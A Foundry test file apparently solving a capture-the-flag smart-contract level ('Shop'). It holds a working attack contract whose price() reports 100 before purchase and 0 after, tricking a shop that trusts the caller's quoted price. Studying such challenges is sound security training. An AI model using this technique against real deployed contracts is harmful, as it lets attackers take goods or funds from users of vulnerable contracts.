// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract ShopAttack {
  IShop internal challenge;

  constructor(address _challengeAddress) {
    challenge = IShop(_challengeAddress);
  }

  function attack() public {
    challenge.buy();
  }

  function price() public view returns (uint) {
    if (challenge.isSold()) {
      return 0;
    }
    return 100;
  }
}

contract ShopTest is Test {
  address internal challengeAddress;
  ShopAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB);

    attackContract = new ShopAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();

    utils.submitLevelInstance(challengeAddress);
  }
}
